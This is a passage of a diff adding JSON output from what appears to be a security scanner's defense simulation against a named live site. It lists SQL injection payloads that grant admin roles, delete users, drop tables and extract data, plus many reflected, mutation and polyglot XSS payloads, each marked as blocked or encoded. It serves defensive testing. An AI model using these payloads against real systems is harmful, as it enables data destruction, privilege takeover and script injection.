+        "payload": "' AND SUBSTRING(username,1,1)='a' FROM users --",
+        "endpoint": "/",
+        "parameter": "input",
+        "attack_category": "Boolean-Based Blind Injection",
+        "defense_action": "Rate Limited",
+        "defense_technique": "Rate Limiting",
+        "explanation": "Rate limit exceeded \u2014 too many injection attempts on / within the monitoring window.",
+        "rules_triggered": [],
+        "safe_query_example": "",
+        "blocked": true
+      },
+      {
+        "payload": "'; UPDATE users SET role='admin' WHERE username='attacker' --",
+        "endpoint": "/",
+        "parameter": "input",
+        "attack_category": "Privilege Escalation",
+        "defense_action": "Rate Limited",
+        "defense_technique": "Rate Limiting",
+        "explanation": "Rate limit exceeded \u2014 too many injection attempts on / within the monitoring window.",
+        "rules_triggered": [],
+        "safe_query_example": "",
+        "blocked": true
+      },
+      {
+        "payload": "'; UPDATE users SET role='admin' WHERE 1=1 --",
+        "endpoint": "/",
+        "parameter": "input",
+        "attack_category": "Privilege Escalation",
+        "defense_action": "Rate Limited",
+        "defense_technique": "Rate Limiting",
+        "explanation": "Rate limit exceeded \u2014 too many injection attempts on / within the monitoring window.",
+        "rules_triggered": [],
+        "safe_query_example": "",
+        "blocked": true
+      },
+      {
+        "payload": "'; UPDATE users SET is_admin=1 WHERE username='attacker' --",
+        "endpoint": "/",
+        "parameter": "input",
+        "attack_category": "Privilege Escalation",
+        "defense_action": "Rate Limited",
+        "defense_technique": "Rate Limiting",
+        "explanation": "Rate limit exceeded \u2014 too many injection attempts on / within the monitoring window.",
+        "rules_triggered": [],
+        "safe_query_example": "",
+        "blocked": true
+      },
+      {
+        "payload": "'; DELETE FROM users --",
+        "endpoint": "/",
+        "parameter": "input",
+        "attack_category": "Data Deletion",
+        "defense_action": "Rate Limited",
+        "defense_technique": "Rate Limiting",
+        "explanation": "Rate limit exceeded \u2014 too many injection attempts on / within the monitoring window.",
+        "rules_triggered": [],
+        "safe_query_example": "",
+        "blocked": true
+      },
+      {
+        "payload": "'; DELETE FROM users WHERE 1=1 --",
+        "endpoint": "/",
+        "parameter": "input",
+        "attack_category": "Data Deletion",
+        "defense_action": "Rate Limited",
+        "defense_technique": "Rate Limiting",
+        "explanation": "Rate limit exceeded \u2014 too many injection attempts on / within the monitoring window.",
+        "rules_triggered": [],
+        "safe_query_example": "",
+        "blocked": true
+      },
+      {
+        "payload": "'; DELETE FROM sessions --",
+        "endpoint": "/",
+        "parameter": "input",
+        "attack_category": "Data Deletion",
+        "defense_action": "Rate Limited",
+        "defense_technique": "Rate Limiting",
+        "explanation": "Rate limit exceeded \u2014 too many injection attempts on / within the monitoring window.",
+        "rules_triggered": [],
+        "safe_query_example": "",
+        "blocked": true
+      },
+      {
+        "payload": "'; DROP TABLE users --",
+        "endpoint": "/",
+        "parameter": "input",
+        "attack_category": "Table Drop",
+        "defense_action": "Rate Limited",
+        "defense_technique": "Rate Limiting",
+        "explanation": "Rate limit exceeded \u2014 too many injection attempts on / within the monitoring window.",
+        "rules_triggered": [],
+        "safe_query_example": "",
+        "blocked": true
+      },
+      {
+        "payload": "'; DROP TABLE sessions --",
+        "endpoint": "/",
+        "parameter": "input",
+        "attack_category": "Table Drop",
+        "defense_action": "Rate Limited",
+        "defense_technique": "Rate Limiting",
+        "explanation": "Rate limit exceeded \u2014 too many injection attempts on / within the monitoring window.",
+        "rules_triggered": [],
+        "safe_query_example": "",
+        "blocked": true
+      },
+      {
+        "payload": "'; DROP TABLE IF EXISTS users --",
+        "endpoint": "/",
+        "parameter": "input",
+        "attack_category": "Table Drop",
+        "defense_action": "Rate Limited",
+        "defense_technique": "Rate Limiting",
+        "explanation": "Rate limit exceeded \u2014 too many injection attempts on / within the monitoring window.",
+        "rules_triggered": [],
+        "safe_query_example": "",
+        "blocked": true
+      },
+      {
+        "payload": "'; INSERT INTO users (username,password,role) VALUES ('hacker','hacked','admin') --",
+        "endpoint": "/",
+        "parameter": "input",
+        "attack_category": "Malicious Data Insertion",
+        "defense_action": "Rate Limited",
+        "defense_technique": "Rate Limiting",
+        "explanation": "Rate limit exceeded \u2014 too many injection attempts on / within the monitoring window.",
+        "rules_triggered": [],
+        "safe_query_example": "",
+        "blocked": true
+      },
+      {
+        "payload": "'; INSERT INTO users VALUES (99,'hacker','hacked','admin') --",
+        "endpoint": "/",
+        "parameter": "input",
+        "attack_category": "Malicious Data Insertion",
+        "defense_action": "Rate Limited",
+        "defense_technique": "Rate Limiting",
+        "explanation": "Rate limit exceeded \u2014 too many injection attempts on / within the monitoring window.",
+        "rules_triggered": [],
+        "safe_query_example": "",
+        "blocked": true
+      },
+      {
+        "payload": "'",
+        "endpoint": "/",
+        "parameter": "input",
+        "attack_category": "Error-Based Injection",
+        "defense_action": "Rate Limited",
+        "defense_technique": "Rate Limiting",
+        "explanation": "Rate limit exceeded \u2014 too many injection attempts on / within the monitoring window.",
+        "rules_triggered": [],
+        "safe_query_example": "",
+        "blocked": true
+      },
+      {
+        "payload": "''",
+        "endpoint": "/",
+        "parameter": "input",
+        "attack_category": "Error-Based Injection",
+        "defense_action": "Rate Limited",
+        "defense_technique": "Rate Limiting",
+        "explanation": "Rate limit exceeded \u2014 too many injection attempts on / within the monitoring window.",
+        "rules_triggered": [],
+        "safe_query_example": "",
+        "blocked": true
+      },
+      {
+        "payload": "' AND 1=CONVERT(int,(SELECT TOP 1 table_name FROM information_schema.tables)) --",
+        "endpoint": "/",
+        "parameter": "input",
+        "attack_category": "Error-Based Injection",
+        "defense_action": "Rate Limited",
+        "defense_technique": "Rate Limiting",
+        "explanation": "Rate limit exceeded \u2014 too many injection attempts on / within the monitoring window.",
+        "rules_triggered": [],
+        "safe_query_example": "",
+        "blocked": true
+      },
+      {
+        "payload": "' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT version()))) --",
+        "endpoint": "/",
+        "parameter": "input",
+        "attack_category": "Error-Based Injection",
+        "defense_action": "Rate Limited",
+        "defense_technique": "Rate Limiting",
+        "explanation": "Rate limit exceeded \u2014 too many injection attempts on / within the monitoring window.",
+        "rules_triggered": [],
+        "safe_query_example": "",
+        "blocked": true
+      },
+      {
+        "payload": "' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT((SELECT version()),0x3a,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a) --",
+        "endpoint": "/",
+        "parameter": "input",
+        "attack_category": "Error-Based Injection",
+        "defense_action": "Rate Limited",
+        "defense_technique": "Rate Limiting",
+        "explanation": "Rate limit exceeded \u2014 too many injection attempts on / within the monitoring window.",
+        "rules_triggered": [],
+        "safe_query_example": "",
+        "blocked": true
+      }
+    ]
+  },
+  "cors_defense_simulation": {
+    "summary": {},
+    "verdicts": []
+  },
+  "xss_defense_simulation": {
+    "summary": {
+      "total_evaluated": 60,
+      "total_mitigated": 60,
+      "total_allowed": 0,
+      "defense_rate": 100.0,
+      "by_technique": {
+        "Output Encoding": 30,
+        "Stored XSS Protection": 6,
+        "Content Security Policy": 3,
+        "JavaScript URI Blocking": 6,
+        "Polyglot Filter": 15
+      },
+      "by_xss_type": {
+        "Reflected XSS": 30,
+        "Stored XSS": 6,
+        "JavaScript URI XSS": 9,
+        "Mutation XSS": 9,
+        "Polyglot XSS": 6
+      },
+      "by_action": {
+        "Encoded": 30,
+        "Sanitized": 6,
+        "Blocked": 24
+      },
+      "target_url": "https://carbon-iq-live.vercel.app",
+      "attack_breakdown": {
+        "Reflected XSS": 30,
+        "Stored XSS": 6,
+        "JavaScript URI XSS": 9,
+        "Mutation XSS": 9,
+        "Polyglot XSS": 6
+      },
+      "analysis_time_ms": 1.8
+    },
+    "verdicts": [
+      {
+        "endpoint": "/",
+        "parameter": "q",
+        "method": "GET",
+        "payload": "<script>alert(1)</script>",
+        "xss_type": "Reflected XSS",
+        "severity": "HIGH",
+        "action": "Encoded",
+        "technique": "Output Encoding",
+        "explanation": "HTML special characters encoded before rendering. < \u2192 &lt;  > \u2192 &gt;  \" \u2192 &quot;  & \u2192 &amp;",
+        "safe_output_example": "&lt;script&gt;alert(1)&lt;/script&gt;",
+        "triggered_rules": [
+          "Output Encoding",
+          "HTML Input Sanitization",
+          "Content Security Policy Enforcement"
+        ],
+        "evidence": "Partial payload reflection detected: 'script' reflected at: ...nIQ</title>\n    <meta name=\"description\" content=\"Measure. Manage....",
+        "confidence": "PROBABLE"
+      },
+      {
+        "endpoint": "/",
+        "parameter": "q",
+        "method": "GET",
+        "payload": "<script>alert('XSS')</script>",
+        "xss_type": "Reflected XSS",
+        "severity": "HIGH",
+        "action": "Encoded",
+        "technique": "Output Encoding",
+        "explanation": "HTML special characters encoded before rendering. < \u2192 &lt;  > \u2192 &gt;  \" \u2192 &quot;  & \u2192 &amp;",
+        "safe_output_example": "&lt;script&gt;alert(&#x27;XSS&#x27;)&lt;/script&gt;",
+        "triggered_rules": [
+          "Output Encoding",
+          "HTML Input Sanitization",
+          "Content Security Policy Enforcement"
+        ],
+        "evidence": "Partial payload reflection detected: 'script' reflected at: ...nIQ</title>\n    <meta name=\"description\" content=\"Measure. Manage....",
+        "confidence": "PROBABLE"
+      },
+      {
+        "endpoint": "/",
+        "parameter": "q",
+        "method": "GET",
+        "payload": "<script>alert(document.domain)</script>",
+        "xss_type": "Reflected XSS",
+        "severity": "HIGH",
+        "action": "Encoded",
+        "technique": "Output Encoding",
+        "explanation": "HTML special characters encoded before rendering. < \u2192 &lt;  > \u2192 &gt;  \" \u2192 &quot;  & \u2192 &amp;",
+        "safe_output_example": "&lt;script&gt;alert(document.domain)&lt;/script&gt;",
+        "triggered_rules": [
+          "Output Encoding",
+          "HTML Input Sanitization",
+          "Content Security Policy Enforcement"
+        ],
+        "evidence": "Partial payload reflection detected: 'script' reflected at: ...nIQ</title>\n    <meta name=\"description\" content=\"Measure. Manage....",
+        "confidence": "PROBABLE"
+      },
+      {
+        "endpoint": "/",
+        "parameter": "q",
+        "method": "GET",
+        "payload": "'\"><script>alert(1)</script>",
+        "xss_type": "Reflected XSS",
+        "severity": "HIGH",
+        "action": "Encoded",
+        "technique": "Output Encoding",
+        "explanation": "HTML special characters encoded before rendering. < \u2192 &lt;  > \u2192 &gt;  \" \u2192 &quot;  & \u2192 &amp;",
+        "safe_output_example": "&#x27;&quot;&gt;&lt;script&gt;alert(1)&lt;/script&gt;",
+        "triggered_rules": [
+          "Output Encoding",
+          "HTML Input Sanitization",
+          "Content Security Policy Enforcement"
+        ],
+        "evidence": "Partial payload reflection detected: 'script' reflected at: ...nIQ</title>\n    <meta name=\"description\" content=\"Measure. Manage....",
+        "confidence": "PROBABLE"
+      },
+      {
+        "endpoint": "/",
+        "parameter": "q",
+        "method": "GET",
+        "payload": "</title><script>alert(1)</script>",
+        "xss_type": "Reflected XSS",
+        "severity": "HIGH",
+        "action": "Encoded",
+        "technique": "Output Encoding",
+        "explanation": "HTML special characters encoded before rendering. < \u2192 &lt;  > \u2192 &gt;  \" \u2192 &quot;  & \u2192 &amp;",
+        "safe_output_example": "&lt;/title&gt;&lt;script&gt;alert(1)&lt;/script&gt;",
+        "triggered_rules": [
+          "Output Encoding",
+          "HTML Input Sanitization",
+          "Content Security Policy Enforcement"
+        ],
+        "evidence": "Partial payload reflection detected: 'script' reflected at: ...nIQ</title>\n    <meta name=\"description\" content=\"Measure. Manage....",
+        "confidence": "PROBABLE"
+      },
+      {
+        "endpoint": "/",
+        "parameter": "q",
+        "method": "GET",
+        "payload": "<ScRiPt>alert(1)</ScRiPt>",
+        "xss_type": "Reflected XSS",
+        "severity": "HIGH",
+        "action": "Encoded",
+        "technique": "Output Encoding",
+        "explanation": "HTML special characters encoded before rendering. < \u2192 &lt;  > \u2192 &gt;  \" \u2192 &quot;  & \u2192 &amp;",
+        "safe_output_example": "&lt;ScRiPt&gt;alert(1)&lt;/ScRiPt&gt;",
+        "triggered_rules": [
+          "Output Encoding",
+          "HTML Input Sanitization",
+          "Content Security Policy Enforcement"
+        ],
+        "evidence": "Partial payload reflection detected: 'ScRiPt' reflected at: ...nIQ</title>\n    <meta name=\"description\" content=\"Measure. Manage....",
+        "confidence": "PROBABLE"
+      },
+      {
+        "endpoint": "/",
+        "parameter": "q",
+        "method": "GET",
+        "payload": "<script >alert(1)</script >",
+        "xss_type": "Reflected XSS",
+        "severity": "HIGH",
+        "action": "Encoded",
+        "technique": "Output Encoding",
+        "explanation": "HTML special characters encoded before rendering. < \u2192 &lt;  > \u2192 &gt;  \" \u2192 &quot;  & \u2192 &amp;",
+        "safe_output_example": "&lt;script &gt;alert(1)&lt;/script &gt;",
+        "triggered_rules": [
+          "Output Encoding",
+          "HTML Input Sanitization",
+          "Content Security Policy Enforcement"
+        ],
+        "evidence": "Partial payload reflection detected: 'script' reflected at: ...nIQ</title>\n    <meta name=\"description\" content=\"Measure. Manage....",
+        "confidence": "PROBABLE"
+      },
+      {
+        "endpoint": "/",
+        "parameter": "q",
+        "method": "GET",
+        "payload": "<!--<script>alert(1)--></script>",
+        "xss_type": "Reflected XSS",
+        "severity": "HIGH",
+        "action": "Encoded",
+        "technique": "Output Encoding",
+        "explanation": "HTML special characters encoded before rendering. < \u2192 &lt;  > \u2192 &gt;  \" \u2192 &quot;  & \u2192 &amp;",
+        "safe_output_example": "&lt;!--&lt;script&gt;alert(1)--&gt;&lt;/script&gt;",
+        "triggered_rules": [
+          "Output Encoding",
+          "HTML Input Sanitization",
+          "Content Security Policy Enforcement"
+        ],
+        "evidence": "Partial payload reflection detected: 'script' reflected at: ...nIQ</title>\n    <meta name=\"description\" content=\"Measure. Manage....",
+        "confidence": "PROBABLE"
+      },
+      {
+        "endpoint": "/",
+        "parameter": "q",
+        "method": "GET",
+        "payload": "<script/src=data:,alert(1)></script>",
+        "xss_type": "Reflected XSS",
+        "severity": "HIGH",
+        "action": "Encoded",
+        "technique": "Output Encoding",
+        "explanation": "HTML special characters encoded before rendering. < \u2192 &lt;  > \u2192 &gt;  \" \u2192 &quot;  & \u2192 &amp;",
+        "safe_output_example": "&lt;script/src=data:,alert(1)&gt;&lt;/script&gt;",
+        "triggered_rules": [
+          "Output Encoding",
+          "HTML Input Sanitization",
+          "Content Security Policy Enforcement"
+        ],
+        "evidence": "Partial payload reflection detected: 'script' reflected at: ...nIQ</title>\n    <meta name=\"description\" content=\"Measure. Manage....",
+        "confidence": "PROBABLE"
+      },
+      {
+        "endpoint": "/",
+        "parameter": "q",
+        "method": "GET",
+        "payload": "<script>/**/alert(1)</script>",
+        "xss_type": "Reflected XSS",
+        "severity": "HIGH",
+        "action": "Encoded",
+        "technique": "Output Encoding",
+        "explanation": "HTML special characters encoded before rendering. < \u2192 &lt;  > \u2192 &gt;  \" \u2192 &quot;  & \u2192 &amp;",
+        "safe_output_example": "&lt;script&gt;/**/alert(1)&lt;/script&gt;",
+        "triggered_rules": [
+          "Output Encoding",
+          "HTML Input Sanitization",
+          "Content Security Policy Enforcement"
+        ],
+        "evidence": "Partial payload reflection detected: 'script' reflected at: ...nIQ</title>\n    <meta name=\"description\" content=\"Measure. Manage....",
+        "confidence": "PROBABLE"
+      },
+      {
+        "endpoint": "/",
+        "parameter": "q",
+        "method": "GET",
+        "payload": "<script>alert('stored-xss')</script>",
+        "xss_type": "Stored XSS",
+        "severity": "CRITICAL",
+        "action": "Sanitized",
+        "technique": "Stored XSS Protection",
+        "explanation": "Input sanitised before database storage AND encoded on output. Double-layer protection prevents persistent XSS execution.",
+        "safe_output_example": "alert(&#x27;stored-xss&#x27;)",
+        "triggered_rules": [
+          "Stored Content Sanitization",
+          "Output Encoding",
+          "Content Security Policy Enforcement"
+        ],
+        "evidence": "Partial payload reflection detected: 'script' reflected at: ...nIQ</title>\n    <meta name=\"description\" content=\"Measure. Manage....",
+        "confidence": "PROBABLE"
+      },
+      {
+        "endpoint": "/",
+        "parameter": "q",
+        "method": "GET",
+        "payload": "'\"><script>alert('stored-xss')</script>",
+        "xss_type": "Stored XSS",
+        "severity": "CRITICAL",
+        "action": "Sanitized",
+        "technique": "Stored XSS Protection",
+        "explanation": "Input sanitised before database storage AND encoded on output. Double-layer protection prevents persistent XSS execution.",
+        "safe_output_example": "&#x27;&quot;&gt;alert(&#x27;stored-xss&#x27;)",
+        "triggered_rules": [
+          "Stored Content Sanitization",
+          "Output Encoding",
+          "Content Security Policy Enforcement"
+        ],
+        "evidence": "Partial payload reflection detected: 'script' reflected at: ...nIQ</title>\n    <meta name=\"description\" content=\"Measure. Manage....",
+        "confidence": "PROBABLE"
+      },
+      {
+        "endpoint": "/",
+        "parameter": "q",
+        "method": "GET",
+        "payload": "&#106;avascript:alert(1)",
+        "xss_type": "JavaScript URI XSS",
+        "severity": "HIGH",
+        "action": "Blocked",
+        "technique": "Content Security Policy",
+        "explanation": "CSP header blocked inline script execution. Content-Security-Policy: script-src 'self'; object-src 'none'",
+        "safe_output_example": "[inline script blocked by CSP]",
+        "triggered_rules": [
+          "Content Security Policy Enforcement"
+        ],
+        "evidence": "Partial payload reflection detected: 'script' reflected at: ...nIQ</title>\n    <meta name=\"description\" content=\"Measure. Manage....",
+        "confidence": "PROBABLE"
+      },
+      {
+        "endpoint": "/",
+        "parameter": "q",
+        "method": "GET",
+        "payload": "vbscript:msgbox(1)",
+        "xss_type": "JavaScript URI XSS",
+        "severity": "HIGH",
+        "action": "Blocked",
+        "technique": "JavaScript URI Blocking",
+        "explanation": "Malicious javascript: / data: URI blocked. Only http:// and https:// protocols are allowed.",
+        "safe_output_example": "[URI blocked: only http/https allowed]",
+        "triggered_rules": [
+          "JavaScript URI Blocking",
+          "Content Security Policy Enforcement"
+        ],
+        "evidence": "Partial payload reflection detected: 'script' reflected at: ...nIQ</title>\n    <meta name=\"description\" content=\"Measure. Manage....",
+        "confidence": "PROBABLE"
+      },
+      {
+        "endpoint": "/",
+        "parameter": "q",
+        "method": "GET",
+        "payload": "data:text/html,<script>alert(1)</script>",
+        "xss_type": "JavaScript URI XSS",
+        "severity": "HIGH",
+        "action": "Blocked",
+        "technique": "JavaScript URI Blocking",
+        "explanation": "Malicious javascript: / data: URI blocked. Only http:// and https:// protocols are allowed.",
+        "safe_output_example": "[URI blocked: only http/https allowed]",
+        "triggered_rules": [
+          "JavaScript URI Blocking",
+          "Content Security Policy Enforcement"
+        ],
+        "evidence": "Partial payload reflection detected: 'script' reflected at: ...nIQ</title>\n    <meta name=\"description\" content=\"Measure. Manage....",
+        "confidence": "PROBABLE"
+      },
+      {
+        "endpoint": "/",
+        "parameter": "q",
+        "method": "GET",
+        "payload": "<math><mi//xlink:href=\"data:x,<script>alert(1)</script>\">",
+        "xss_type": "Mutation XSS",
+        "severity": "HIGH",
+        "action": "Blocked",
+        "technique": "Polyglot Filter",
+        "explanation": "Layered defence applied to polyglot payload. Sanitisation + encoding + CSP combined for multi-vector protection.",
+        "safe_output_example": "[multi-vector payload filtered by layered defence]",
+        "triggered_rules": [
+          "Polyglot Payload Filter",
+          "HTML Input Sanitization",
+          "Content Security Policy Enforcement"
+        ],
+        "evidence": "Partial payload reflection detected: 'script' reflected at: ...nIQ</title>\n    <meta name=\"description\" content=\"Measure. Manage....",
+        "confidence": "PROBABLE"
+      },
+      {
+        "endpoint": "/",
+        "parameter": "q",
+        "method": "GET",
+        "payload": "<noscript><p title=\"</noscript><img src=x onerror=alert(1)>\">",
+        "xss_type": "Mutation XSS",
+        "severity": "HIGH",
+        "action": "Blocked",
+        "technique": "Polyglot Filter",
+        "explanation": "Layered defence applied to polyglot payload. Sanitisation + encoding + CSP combined for multi-vector protection.",
+        "safe_output_example": "[multi-vector payload filtered by layered defence]",
+        "triggered_rules": [
+          "Polyglot Payload Filter",
+          "HTML Input Sanitization",
+          "Content Security Policy Enforcement"
+        ],
+        "evidence": "Partial payload reflection detected: 'script' reflected at: ...nIQ</title>\n    <meta name=\"description\" content=\"Measure. Manage....",
+        "confidence": "PROBABLE"
+      },
+      {
+        "endpoint": "/",
+        "parameter": "q",
+        "method": "GET",
+        "payload": "<table><caption><p><b><u><s></caption></table><script>alert(1)</script>",
+        "xss_type": "Mutation XSS",
+        "severity": "HIGH",
+        "action": "Blocked",
+        "technique": "Polyglot Filter",
+        "explanation": "Layered defence applied to polyglot payload. Sanitisation + encoding + CSP combined for multi-vector protection.",
+        "safe_output_example": "[multi-vector payload filtered by layered defence]",
+        "triggered_rules": [
+          "Polyglot Payload Filter",
+          "HTML Input Sanitization",
+          "Content Security Policy Enforcement"
+        ],
+        "evidence": "Partial payload reflection detected: 'script' reflected at: ...nIQ</title>\n    <meta name=\"description\" content=\"Measure. Manage....",
+        "confidence": "PROBABLE"
+      },
+      {
+        "endpoint": "/",
+        "parameter": "q",
+        "method": "GET",
+        "payload": "javascript:/*--></title></style></textarea></script></xmp><svg/onload='+/\"/+/onmouseover=1/+/[*/[]/+alert(1)//'>",
+        "xss_type": "Polyglot XSS",
+        "severity": "HIGH",
+        "action": "Blocked",
+        "technique": "Polyglot Filter",
+        "explanation": "Layered defence applied to polyglot payload. Sanitisation + encoding + CSP combined for multi-vector protection.",
+        "safe_output_example": "[multi-vector payload filtered by layered defence]",
+        "triggered_rules": [
+          "Polyglot Payload Filter",
+          "Output Encoding",
+          "HTML Input Sanitization",
+          "Content Security Policy Enforcement"
+        ],
+        "evidence": "Partial payload reflection detected: 'script' reflected at: ...nIQ</title>\n    <meta name=\"description\" content=\"Measure. Manage....",
+        "confidence": "PROBABLE"
+      },
+      {
+        "endpoint": "/",
+        "parameter": "q",
+        "method": "GET",
+        "payload": "';alert(1)//';alert(1)//\";alert(1)//\";alert(1)//--></SCRIPT>'><SCRIPT>alert(1)</SCRIPT>",
+        "xss_type": "Polyglot XSS",
+        "severity": "HIGH",
+        "action": "Blocked",
+        "technique": "Polyglot Filter",
+        "explanation": "Layered defence applied to polyglot payload. Sanitisation + encoding + CSP combined for multi-vector protection.",
+        "safe_output_example": "[multi-vector payload filtered by layered defence]",
+        "triggered_rules": [
+          "Polyglot Payload Filter",
+          "Output Encoding",
+          "HTML Input Sanitization",
+          "Content Security Policy Enforcement"
+        ],
+        "evidence": "Partial payload reflection detected: 'SCRIPT' reflected at: ...nIQ</title>\n    <meta name=\"description\" content=\"Measure. Manage....",
+        "confidence": "PROBABLE"
+      },
+      {
+        "endpoint": "/",
+        "parameter": "input",
+        "method": "GET",
+        "payload": "<script>alert(1)</script>",
+        "xss_type": "Reflected XSS",
+        "severity": "HIGH",
+        "action": "Encoded",
+        "technique": "Output Encoding",
+        "explanation": "HTML special characters encoded before rendering. < \u2192 &lt;  > \u2192 &gt;  \" \u2192 &quot;  & \u2192 &amp;",
+        "safe_output_example": "&lt;script&gt;alert(1)&lt;/script&gt;",
+        "triggered_rules": [
+          "Output Encoding",
+          "HTML Input Sanitization",
+          "Content Security Policy Enforcement"
+        ],
+        "evidence": "Partial payload reflection detected: 'script' reflected at: ...nIQ</title>\n    <meta name=\"description\" content=\"Measure. Manage....",
+        "confidence": "PROBABLE"
+      },
+      {
+        "endpoint": "/",
+        "parameter": "input",
+        "method": "GET",
+        "payload": "<script>alert('XSS')</script>",
+        "xss_type": "Reflected XSS",
+        "severity": "HIGH",
+        "action": "Encoded",
+        "technique": "Output Encoding",
+        "explanation": "HTML special characters encoded before rendering. < \u2192 &lt;  > \u2192 &gt;  \" \u2192 &quot;  & \u2192 &amp;",
+        "safe_output_example": "&lt;script&gt;alert(&#x27;XSS&#x27;)&lt;/script&gt;",
+        "triggered_rules": [
+          "Output Encoding",
+          "HTML Input Sanitization",
+          "Content Security Policy Enforcement"
+        ],
+        "evidence": "Partial payload reflection detected: 'script' reflected at: ...nIQ</title>\n    <meta name=\"description\" content=\"Measure. Manage....",
+        "confidence": "PROBABLE"
+      },
+      {
+        "endpoint": "/",
+        "parameter": "input",
+        "method": "GET",
+        "payload": "<script>alert(document.domain)</script>",
+        "xss_type": "Reflected XSS",
+        "severity": "HIGH",
+        "action": "Encoded",
+        "technique": "Output Encoding",
+        "explanation": "HTML special characters encoded before rendering. < \u2192 &lt;  > \u2192 &gt;  \" \u2192 &quot;  & \u2192 &amp;",
+        "safe_output_example": "&lt;script&gt;alert(document.domain)&lt;/script&gt;",
+        "triggered_rules": [
+          "Output Encoding",
+          "HTML Input Sanitization",
+          "Content Security Policy Enforcement"
+        ],
+        "evidence": "Partial payload reflection detected: 'script' reflected at: ...nIQ</title>\n    <meta name=\"description\" content=\"Measure. Manage....",
+        "confidence": "PROBABLE"
+      },
+      {
+        "endpoint": "/",
+        "parameter": "input",
+        "method": "GET",
+        "payload": "'\"><script>alert(1)</script>",
+        "xss_type": "Reflected XSS",
+        "severity": "HIGH",
+        "action": "Encoded",
+        "technique": "Output Encoding",
+        "explanation": "HTML special characters encoded before rendering. < \u2192 &lt;  > \u2192 &gt;  \" \u2192 &quot;  & \u2192 &amp;",
+        "safe_output_example": "&#x27;&quot;&gt;&lt;script&gt;alert(1)&lt;/script&gt;",
+        "triggered_rules": [
+          "Output Encoding",
+          "HTML Input Sanitization",
+          "Content Security Policy Enforcement"
+        ],
+        "evidence": "Partial payload reflection detected: 'script' reflected at: ...nIQ</title>\n    <meta name=\"description\" content=\"Measure. Manage....",
+        "confidence": "PROBABLE"
+      },
+      {
+        "endpoint": "/",
+        "parameter": "input",
+        "method": "GET",
+        "payload": "</title><script>alert(1)</script>",
+        "xss_type": "Reflected XSS",
+        "severity": "HIGH",
+        "action": "Encoded",
+        "technique": "Output Encoding",
+        "explanation": "HTML special characters encoded before rendering. < \u2192 &lt;  > \u2192 &gt;  \" \u2192 &quot;  & \u2192 &amp;",
+        "safe_output_example": "&lt;/title&gt;&lt;script&gt;alert(1)&lt;/script&gt;",
+        "triggered_rules": [
+          "Output Encoding",
+          "HTML Input Sanitization",
+          "Content Security Policy Enforcement"
+        ],
+        "evidence": "Partial payload reflection detected: 'script' reflected at: ...nIQ</title>\n    <meta name=\"description\" content=\"Measure. Manage....",
+        "confidence": "PROBABLE"
+      },
+      {
+        "endpoint": "/",
+        "parameter": "input",
+        "method": "GET",
+        "payload": "<ScRiPt>alert(1)</ScRiPt>",
+        "xss_type": "Reflected XSS",
+        "severity": "HIGH",
+        "action": "Encoded",
+        "technique": "Output Encoding",
+        "explanation": "HTML special characters encoded before rendering. < \u2192 &lt;  > \u2192 &gt;  \" \u2192 &quot;  & \u2192 &amp;",
+        "safe_output_example": "&lt;ScRiPt&gt;alert(1)&lt;/ScRiPt&gt;",
+        "triggered_rules": [
+          "Output Encoding",
+          "HTML Input Sanitization",
+          "Content Security Policy Enforcement"
+        ],
+        "evidence": "Partial payload reflection detected: 'ScRiPt' reflected at: ...nIQ</title>\n    <meta name=\"description\" content=\"Measure. Manage....",
+        "confidence": "PROBABLE"
+      },
+      {
+        "endpoint": "/",
+        "parameter": "input",
+        "method": "GET",
+        "payload": "<script >alert(1)</script >",
+        "xss_type": "Reflected XSS",
+        "severity": "HIGH",
+        "action": "Encoded",
+        "technique": "Output Encoding",
+        "explanation": "HTML special characters encoded before rendering. < \u2192 &lt;  > \u2192 &gt;  \" \u2192 &quot;  & \u2192 &amp;",
+        "safe_output_example": "&lt;script &gt;alert(1)&lt;/script &gt;",
+        "triggered_rules": [
+          "Output Encoding",
+          "HTML Input Sanitization",
+          "Content Security Policy Enforcement"
+        ],
+        "evidence": "Partial payload reflection detected: 'script' reflected at: ...nIQ</title>\n    <meta name=\"description\" content=\"Measure. Manage....",
+        "confidence": "PROBABLE"
+      },
+      {
+        "endpoint": "/",
+        "parameter": "input",
+        "method": "GET",
+        "payload": "<!--<script>alert(1)--></script>",
+        "xss_type": "Reflected XSS",
+        "severity": "HIGH",
+        "action": "Encoded",
+        "technique": "Output Encoding",
+        "explanation": "HTML special characters encoded before rendering. < \u2192 &lt;  > \u2192 &gt;  \" \u2192 &quot;  & \u2192 &amp;",
+        "safe_output_example": "&lt;!--&lt;script&gt;alert(1)--&gt;&lt;/script&gt;",
+        "triggered_rules": [
+          "Output Encoding",
+          "HTML Input Sanitization",
+          "Content Security Policy Enforcement"
+        ],
+        "evidence": "Partial payload reflection detected: 'script' reflected at: ...nIQ</title>\n    <meta name=\"description\" content=\"Measure. Manage....",
+        "confidence": "PROBABLE"
+      },
+      {
+        "endpoint": "/",
+        "parameter": "input",
+        "method": "GET",
+        "payload": "<script/src=data:,alert(1)></script>",
+        "xss_type": "Reflected XSS",
+        "severity": "HIGH",
+        "action": "Encoded",
+        "technique": "Output Encoding",
+        "explanation": "HTML special characters encoded before rendering. < \u2192 &lt;  > \u2192 &gt;  \" \u2192 &quot;  & \u2192 &amp;",
+        "safe_output_example": "&lt;script/src=data:,alert(1)&gt;&lt;/script&gt;",
+        "triggered_rules": [
+          "Output Encoding",
+          "HTML Input Sanitization",
+          "Content Security Policy Enforcement"
+        ],
+        "evidence": "Partial payload reflection detected: 'script' reflected at: ...nIQ</title>\n    <meta name=\"description\" content=\"Measure. Manage....",
+        "confidence": "PROBABLE"
+      },
+      {
+        "endpoint": "/",
+        "parameter": "input",
+        "method": "GET",
+        "payload": "<script>/**/alert(1)</script>",
+        "xss_type": "Reflected XSS",
+        "severity": "HIGH",
+        "action": "Encoded",
+        "technique": "Output Encoding",
+        "explanation": "HTML special characters encoded before rendering. < \u2192 &lt;  > \u2192 &gt;  \" \u2192 &quot;  & \u2192 &amp;",
+        "safe_output_example": "&lt;script&gt;/**/alert(1)&lt;/script&gt;",
+        "triggered_rules": [
+          "Output Encoding",
+          "HTML Input Sanitization",
+          "Content Security Policy Enforcement"
+        ],
+        "evidence": "Partial payload reflection detected: 'script' reflected at: ...nIQ</title>\n    <meta name=\"description\" content=\"Measure. Manage....",
+        "confidence": "PROBABLE"
+      },
+      {
+        "endpoint": "/",
+        "parameter": "input",
+        "method": "GET",
+        "payload": "<script>alert('stored-xss')</script>",
+        "xss_type": "Stored XSS",
